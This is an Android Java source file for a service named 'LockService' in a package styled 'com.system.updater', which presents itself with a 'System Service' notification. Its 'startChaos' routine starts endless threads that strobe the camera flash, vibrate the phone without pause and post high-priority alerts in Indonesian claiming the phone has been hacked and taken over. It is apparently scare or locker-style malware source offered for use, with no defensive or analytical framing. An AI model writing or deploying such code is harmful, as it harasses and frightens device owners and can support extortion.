package com.system.updater;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.IBinder;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.util.Log;
import androidx.core.app.NotificationCompat;

public class LockService extends Service {
    private static final String CHANNEL_ID = "lock_channel";
    private CameraManager cameraManager;
    private String cameraId;
    private boolean torchOn = false;
    private Vibrator vibrator;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, createNotification());

        vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            for (String id : cameraManager.getCameraIdList()) {
                if (cameraManager.getCameraCharacteristics(id).get(CameraCharacteristics.FLASH_INFO_AVAILABLE)) {
                    cameraId = id;
                    break;
                }
            }
        } catch (CameraAccessException e) {
            Log.e("LockService", "Camera error", e);
        }

        startChaos();
    }

    private void startChaos() {
        // Flash
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(1000 + (int)(Math.random() * 3000));
                    toggleFlash();
                } catch (InterruptedException e) {
                    break;
                }
            }
        }).start();

        // Vibration
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(500 + (int)(Math.random() * 1500));
                    vibrate();
                } catch (InterruptedException e) {
                    break;
                }
            }
        }).start();

        // Notifications
        new Thread(() -> {
            String[] msgs = {"KAMU TELAH DI-HACK!", "HP KAMU DIAMBIL ALIH!", "BACA PESAN PENTING!"};
            while (true) {
                try {
                    Thread.sleep(5000);
                    sendNotification(msgs[(int)(Math.random() * msgs.length)]);
                } catch (InterruptedException e) {
                    break;
                }
            }
        }).start();
    }

    private void toggleFlash() {
        if (cameraId == null) return;
        try {
            torchOn = !torchOn;
            cameraManager.setTorchMode(cameraId, torchOn);
        } catch (CameraAccessException e) {
            Log.e("LockService", "Flash error", e);
        }
    }

    private void vibrate() {
        if (vibrator == null) return;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(VibrationEffect.createWaveform(
                new long[]{200, 100, 300, 100, 500, 200},
                new int[]{255, 128, 255, 128, 255, 128},
                0
            ));
        } else {
            vibrator.vibrate(new long[]{200, 100, 300, 100, 500, 200}, 0);
        }
    }

    private void sendNotification(String msg) {
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SYSTEM ALERT")
            .setContentText(msg)
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setPriority(NotificationCompat.PRIORITY_HIGH);
        nm.notify((int)System.currentTimeMillis(), builder.build());
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Lock Service",
                NotificationManager.IMPORTANCE_HIGH
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (cameraId != null) {
            try {
                cameraManager.setTorchMode(cameraId, false);
            } catch (CameraAccessException e) {}
        }
    }
}
